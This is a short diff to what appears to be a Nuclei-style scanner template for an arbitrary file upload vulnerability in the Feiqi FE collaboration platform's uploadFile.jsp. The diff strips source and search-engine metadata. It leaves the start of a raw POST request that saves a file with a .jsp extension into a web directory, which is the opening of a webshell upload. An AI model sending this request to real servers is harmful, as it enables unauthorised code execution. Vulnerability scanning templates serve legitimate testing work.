@@ -3,14 +3,8 @@ info:
   name: 飞企互联FE业务协作平台uploadFile.jsp任意文件上传漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/e25d0640baa80844df29b399cfbbcba3
-
-    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
   tags: file-upload,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: e25d0640baa80844df29b399cfbbcba3
-    fofa: + hunter`app.name=="飞企互联 FE 6.0+"`||`app.name=="飞企互联 FE"`
 http:
 - raw:
   - 'POST /common/uploadFile.jsp?action=save&savePath=/images/upload/&fileName=23092446220001.jpg&title1=%CE%C4%BC%FE%C9%CF%B4%AB&title2=%D1%A1%D4%F1%CE%C4%BC%FE%A3%BA&allowsize=null&extName=.jsp HTTP/1.1
